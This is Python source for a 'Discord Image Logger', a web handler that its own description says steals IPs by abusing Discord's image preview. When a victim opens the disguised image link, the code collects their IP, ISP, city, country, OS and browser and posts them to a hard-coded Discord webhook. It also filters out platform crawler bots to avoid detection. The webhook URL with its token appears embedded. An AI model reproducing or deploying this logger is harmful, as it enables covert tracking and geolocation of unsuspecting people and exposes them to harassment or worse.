from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", 
    "imageArgument": True, 

    # CUSTOMIZATION #
    "username": "Image Logger", 
    "color": 0x00FFFF, 

    # OPTIONS #
    "crashBrowser": False, 
    "accurateLocation": False, 

    "message": { 
        "doMessage": False, 
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", 
        "richMessage": True, 
    },

    "vpnCheck": 1, 
    "linkAlerts": True, 
    "buggedImage": True, 
    "antiBot": 1, 

    # REDIRECTION #
    "redirect": {
        "redirect": False, 
        "page": "https://your-link.here" 
    },
}

blacklistedIPs = ("27", "104", "143", "164") 

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip and ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json = {
                "username": config["username"],
                "content": "",
                "embeds": [
                    {
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    }
                ],
            })
        return

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    except:
        return

    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting"):
        if config["antiBot"] == 4:
            if not info.get("proxy"): return
        if config["antiBot"] == 3: return
        if config["antiBot"] == 2 and not info.get("proxy"): ping = ""
        if config["antiBot"] == 1: ping = ""

    os_info, browser_info = httpagentparser.simple_detect(useragent if useragent else "")
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **VPN:** `{info.get('proxy')}`

**PC Info:**
> **OS:** `{os_info}`
> **Browser:** `{browser_info}`""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

# Vercel busca una clase llamada 'handler'
class handler(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
            if config["imageArgument"] and (dic.get("url") or dic.get("id")):
                url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
            else:
                url = config["image"]

            # Obtener IP real tras el proxy de Vercel
            ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
            ua = self.headers.get('user-agent', '')
            
            if ip.startswith(blacklistedIPs):
                return
            
            if botCheck(ip, ua):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()
                if config["buggedImage"]: self.wfile.write(binaries["loading"])
                makeReport(ip, endpoint = s.split("?")[0], url = url)
                return
            
            else:
                result = makeReport(ip, ua, endpoint = s.split("?")[0], url = url)
                
                # Lógica de respuesta HTML/Redirección
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                
                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                else:
                    data = f"<html><body style='margin:0'><img src='{url}' style='width:100%'></body></html>".encode()
                
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.end_headers()
            reportError(traceback.format_exc())

    def do_GET(self):
        self.handleRequest()

    def do_POST(self):
        self.handleRequest()
